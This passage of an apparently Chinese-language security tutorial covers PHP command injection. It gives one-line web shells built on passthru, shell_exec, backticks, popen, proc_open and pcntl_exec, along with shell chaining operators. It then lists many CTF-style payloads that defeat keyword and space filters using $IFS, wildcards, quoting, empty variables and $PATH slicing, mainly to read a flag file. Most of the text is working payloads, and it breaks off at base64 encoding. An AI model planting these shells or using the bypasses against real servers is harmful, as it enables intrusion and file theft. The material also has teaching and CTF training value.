<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>与反引号**(&#96;)**类似</li>
<li><code>$command</code>为执行的命令</li>
<li><code>shell_exec()</code>函数默认无回显，通过 <code>echo</code>可将执行结果输出到页面</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">`要执行的命令`</span><br></pre></td></tr></table></figure></div>

<ul>
<li>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span> ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> )</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>$command</code>为执行的命令</li>
<li><code>$mode</code>指针文件的连接模式，<code>r</code>表示阅读，<code>w</code>表示写入</li>
<li><code>popen()</code>函数不会直接返回执行结果，而是返回一个文件指针。</li>
<li>此指针可以用于<code>fgets()</code>，<code>fgetss()</code>和 <code>fwrite()</code>。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ben</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$ben</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=10129325 gid=10129325 groups=10129325</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$command</span> , </span><br><span class="line">	<span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line">	<span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>$command</code>为执行的命令</li>
<li><code>$descriptorspec</code>定义要创建的进程的输入、输出和错误流的规范</li>
<li><code>$pipes</code>一个引用变量，用于存储与进程通信管道，调用数组内容。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入</span></span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容</span></span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;/tmp/error-output.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)    <span class="comment">//标准输出错误</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="pcntl-php"><a href="#pcntl-php" class="headerlink" title="pcntl.php"></a>pcntl.php</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	pcntl_exec(&quot;/bin/bash&quot;,array($_POST[&quot;cmd&quot;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-操作系统链接符"><a href="#0x04-操作系统链接符" class="headerlink" title="0x04 操作系统链接符"></a>0x04 操作系统链接符</h1><p><strong>；</strong></p>
<ul>
<li>使多个命令按顺序执行</li>
<li>前面的命令和命令都会执行，相互之间不影响</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span>;<span class="built_in">ls</span>;<span class="built_in">pwd</span></span><br></pre></td></tr></table></figure></div>

<p><strong>&amp;</strong></p>
<ul>
<li>使命令在后台执行，这样就可以同时执行多条命令</li>
<li>无论命令为真或假，都执行</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id&amp;ls&amp;pwd</span><br></pre></td></tr></table></figure></div>

<p><strong>&amp;&amp;</strong></p>
<ul>
<li>前面的命令执行成功则执行后面的命令</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">    system(&quot;ls&quot;.$cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">?cmd=&amp;&amp;id</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<p><strong>|</strong></p>
<ul>
<li>把前面命令的执行结果当成后面命令的参数</li>
<li>如果都为真，则都执行，但只显示最后命令的执行结果</li>
</ul>
<p><strong>||</strong></p>
<ul>
<li>类似于if-else语句</li>
<li>若前面的命令执行成功，则后面的命令不执行</li>
<li>若前面的命令执行失败，则后面的命令被执行</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&quot;&gt;/dev/null 2&gt;&amp;1&quot;  把正常输出和错误输出全部丢掉</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">payload:</span></span><br><span class="line"><span class="comment">?cmd=id||</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x05-绕过方式"><a href="#0x05-绕过方式" class="headerlink" title="0x05  绕过方式"></a>0x05  绕过方式</h1><h2 id="过滤命令执行函数"><a href="#过滤命令执行函数" class="headerlink" title="过滤命令执行函数"></a>过滤命令执行函数</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/exec|system|popen|proc_open|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你是黑客么？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">尝试未被过滤的命令函数，如passthru()</span></span><br><span class="line"><span class="comment">payload:</span></span><br><span class="line"><span class="comment">?cmd=passthru(&#x27;ls&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;# #&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;过滤后的命令：&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&lt;/br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;命令执行结果如下：&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>大括号{}</strong></p>
<ul>
<li>可以将要执行的内容包含在{}内部进行执行</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=&#123;<span class="built_in">ls</span>,-l&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>$IFS</strong></p>
<ul>
<li>$IFS是linux系统的特殊环境变量，叫做内部字段分隔符</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span><span class="variable">$IFS</span>-l</span><br></pre></td></tr></table></figure></div>

<ul>
<li>IFS被bash解释器当成变量名，加一个{}就可以固定变量名</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span><span class="variable">$&#123;IFS&#125;</span>-l</span><br></pre></td></tr></table></figure></div>

<ul>
<li>$IFS$9 后的$与{}类似，起隔断作用</li>
<li>$9是当前系统shell进程第九个参数持有者，始终为空字符</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span>$IFS<span class="variable">$9</span>-l</span><br></pre></td></tr></table></figure></div>

<p><strong>重定向字符</strong></p>
<ul>
<li>&lt;表示输入重定向</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line">?cmd=<span class="built_in">cat</span>&lt;&gt;flag.php</span><br><span class="line">?cmd=<span class="built_in">ls</span>&lt;&gt;-l</span><br></pre></td></tr></table></figure></div>

<p><strong>%09(tab)</strong></p>
<ul>
<li>%09是tab键的URL编码值</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span>%09-l</span><br></pre></td></tr></table></figure></div>

<h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;命令有问题哦，来黑我丫！！！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>通配符绕过</strong></p>
<ul>
<li><code>?</code>在linux中可以代替字母。<code>?</code>仅代表单个字符串，但此单字必须存在</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fl?g.p?p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>*</code>在linux中可以进行模糊匹配。<code>*</code>可以代表任何字符串。</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla*&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>单引号、双引号绕过</strong></p>
<ul>
<li>可以代表空字符</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla&quot;&quot;g.ph&quot;&quot;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">?cmd=passthru(<span class="string">&quot;cat fla&#x27;&#x27;g.ph&#x27;&#x27;p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>反斜杠绕过</strong></p>
<ul>
<li>去掉特殊字符的功能性，单纯表示为字符串</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla\g.ph\p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>特殊变量</strong></p>
<ul>
<li>输出的结果为空</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$9</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$@</span></span><br><span class="line"><span class="built_in">echo</span> $*</span><br><span class="line"><span class="comment">#$1到$9，$@和$*输出结果都为空</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$10</span> </span><br><span class="line"><span class="comment">#输出 0 </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$11</span> </span><br><span class="line"><span class="comment">#输出 1</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>$1到$9</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla$1g.ph$9p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>$@和$*</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla$@g.ph$@p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>内联执行</strong></p>
<ul>
<li>自定义字符串，在拼接起来</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;a=f;b=la;c=g;d=.;e=ph;f=p;cat $a$b$c$d$e$f&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>利用linux中的环境变量</strong></p>
<ul>
<li>使用环境变量里的字符执行变量</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PATH默认系统环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;PATH:x:y&#125;</span></span><br><span class="line"><span class="comment"># x代表环境变量中的第几位，y代表总共几位，第一位从0开始</span></span><br><span class="line"></span><br><span class="line">eg: </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:5:1&#125;</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">l</span><br></pre></td></tr></table></figure></div>

<ul>
<li>构造payload</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;g.p?p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="文件读取命令绕过"><a href="#文件读取命令绕过" class="headerlink" title="文件读取命令绕过"></a>文件读取命令绕过</h2><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell|\&#x27;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再来黑我丫！！！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>tac</strong></p>
<ul>
<li>与<code>cat</code>功能相似，但是反向显示，从最后一行往前开始显示</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;tac fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>more</strong></p>
<ul>
<li>一页一页的显示文档内容</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;more fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>less</strong></p>
<ul>
<li>与<code>more</code>类似</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;less fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>tail</strong></p>
<ul>
<li>默认显示最后10行</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;tail fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>nl</strong></p>
<ul>
<li>显示的时候顺便输出行号</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;nl fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>od</strong></p>
<ul>
<li>以二进制的方式读取档案内容</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;od -A d -c fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>xxd</strong></p>
<ul>
<li>读取二进制文件</li>
<li>需要安装</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;xxd fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>sort</strong></p>
<ul>
<li>主要用于排序文件</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;s?rt fl\ag.ph\p&quot;</span>);</span><br><span class="line">?cmd=passthru(<span class="string">&quot;/usr/bin/s?rt fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>uniq</strong></p>
<ul>
<li>报告或删除文件中重复的行</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;uniq fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>file -f</strong></p>
<ul>
<li><p>-f   查看文件中的文件名的文件类型，会显示报错的内容</p>
</li>
<li><p>报错出具体内容</p>
</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;file -f fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>grep</strong></p>
<ul>
<li>在文本中查找指定的字符串</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;grep fla fl\ag.ph\p&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#从 fl\ag.ph\p 文本文件中查找包含 fla 字符串的行</span></span><br></pre></td></tr></table></figure></div>

<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再来黑我丫！！！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>base64编码绕过</strong></p>
<ul>
<li>python编码</li>
</ul>
